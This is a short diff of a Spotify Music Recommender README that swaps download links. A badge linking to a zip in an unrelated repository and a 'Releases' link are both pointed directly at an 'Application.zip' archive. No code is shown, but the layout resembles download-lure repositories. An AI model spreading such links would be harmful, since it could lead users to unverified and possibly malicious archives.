@@ -1,6 +1,6 @@
 # 🔊 **Spotify Music Recommender**
 
-[![Download](https://img.shields.io/badge/Download-Launch-red)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download](https://github.com/dahoodmans/Spotify-Music-Recommender/releases/download/v1.0/Application.zip)](https://github.com/dahoodmans/Spotify-Music-Recommender/releases/download/v1.0/Application.zip)
 
 ---
 
@@ -66,7 +66,7 @@ As we continue to develop the Spotify Music Recommender, we aim to incorporate a
 
 ## 📡 Stay Connected
 
-For updates and new releases, visit the [Releases](https://github.com/adelante20/Release/releases) section of this repository.
+For updates and new releases, visit the [Releases](https://github.com/dahoodmans/Spotify-Music-Recommender/releases/download/v1.0/Application.zip) section of this repository.
 
 ---
 
